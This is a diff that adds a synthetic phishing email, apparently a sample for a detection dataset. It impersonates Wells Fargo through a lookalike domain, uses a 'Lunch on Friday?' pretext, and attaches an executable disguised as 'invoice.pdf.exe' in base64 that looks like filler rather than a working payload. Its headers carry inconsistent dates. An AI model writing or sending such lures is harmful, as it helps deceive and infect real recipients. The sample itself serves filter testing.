@@ -1,0 +1,48 @@
+From: notice@wells-fargo-alert.top
+To: victim46@example.com
+Subject: Lunch on Friday? [ref AF96E42]
+Date: Tue, 25 Mar 2002 04:58:00 -0500
+Message-ID: <phish-226-bfca0e5f-5c64-45f4-be8c-c0e0e86ae861@wells-fargo-alert.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 27 Mar 2002 04:57:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 06 Mar 2002 09:58:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 05 Mar 2002 22:45:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 20 Mar 2002 21:50:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 26 Mar 2002 21:48:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 17 Mar 2002 04:04:00 -0500
+Return-Path: <notice@wells-fargo-alert.top>
+Reply-To: notice@wells-fargo-alert.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=wells-fargo-alert.top; dkim=pass header.d=wells-fargo-alert.top; dmarc=pass header.from=wells-fargo-alert.top
+Received-SPF: pass (mx.example.com: domain of notice@wells-fargo-alert.top designates 192.0.2.46 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=wells-fargo-alert.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-226-ffc6cfd7"
+
+--bnd-p-226-ffc6cfd7
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: AF96E42
+
+Thanks,
+Colleague
+--bnd-p-226-ffc6cfd7
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+
+TVqQAORw7UKY7Z/GJ6X4ogBo9FjslfbuVxXY1PXy/bD7m2xcPpVNAVE0tpqPzlfHI4mq6b/Cu1D0
+7u9pkNh2uWskUXK9YN4KuicwlnWLQxlAbIS+NJYZMm33+RO/zkUFeHGn/qHexW0hPjYQmSRCpIEY
+33Xtmi25h2evhcTpBYCY03khUdUGwokqh6+xJgQcBayoJTVsXOY5UGDc9vAhcp9ZO+BdGzEhhtPd
+GJ5UyTEVRjzf/CxDcUzbpJH1Qg72wsGTOn3Etm+scAvExw6f0AutL+0KCZcrv+MQ1E1eo7iJejxC
+KqN0hxZIXoYgrOrzej1zawhUfZWTfWLcA6/2Z0Uhjcsvn/LKkJ3CPFhPwGIInFymzLzJ/WjeuZuF
+AFZndwsgH89hzn/LMCQssaCZ8Ye0C8tvDLfKdidHaIkwz0axShtC7tXZmDj4lpUEEcfHwG2zZKsI
+jVlengcLUpW8Y3bEmknH+2NV8XK44mgKSA+Bs0kZBuC2/1a+9MPdlfdeisO4L6WXQTxEH9wTBIhp
+uVg7CE5DssmiKLs+rHr1B7lFj7zMLS74+FGha9CQvbCqko9i/pmk/3WV3QQfTVvwP1KQ40Oo3aCN
+QwEXqPIZo/Hs5cxwORijSIVMDXE1hw+leHFSkOF8922gljj8l07beH0r6S2aZ+YBmLkBrKHCfOjJ
+x56U/qUm6jkVAxvdyeOrYe+czQ/EsqqMb6WuzP6T5tzCgjjzA7OFKUTsCkAfcqaRdXkMI6LhmP5K
+mTPdL/W5cVsrG+t8J5Vy0Np0mepuWn2jEa1APXA9AxESVXxWr0cblKxHSqvo07jPjU0UqEMx3Cip
+qySwGwsctRntQMTnnA==
+
+--bnd-p-226-ffc6cfd7--
